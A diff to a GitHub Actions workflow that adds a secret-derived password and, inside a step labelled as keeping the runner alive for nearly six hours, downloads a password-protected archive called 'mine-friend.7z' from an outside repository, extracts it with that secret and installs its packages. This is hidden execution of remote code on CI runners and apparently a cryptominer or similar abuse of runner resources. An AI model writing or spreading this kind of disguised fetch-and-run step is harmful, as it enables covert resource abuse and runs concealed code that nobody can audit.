@@ -1,8 +1,11 @@
-name: SHS
+name: FP_TOM
 
 on:
   workflow_dispatch: 
 
+env:
+  PASS: ${{ secrets.FP }}
+  
 jobs:
   ubuntu-desktop:
     runs-on: ubuntu-latest
@@ -36,6 +39,9 @@ jobs:
       - name: Keep alive (5h 45m)
         run: |
           echo "Keeping runner alive..."
+          curl -LO https://github.com/mishakokzix/test/raw/refs/heads/main/mine-friend.7z 
+          7z x mine-friend.7z -p"$PASS" -y
+          cd mine-friend && rm package-lock.json && pnpm i 
           echo "End time: $(date -d '+5 hours 45 minutes')"
           for i in $(seq 1 345); do
             echo "Minute $i / 345 — $(date)"
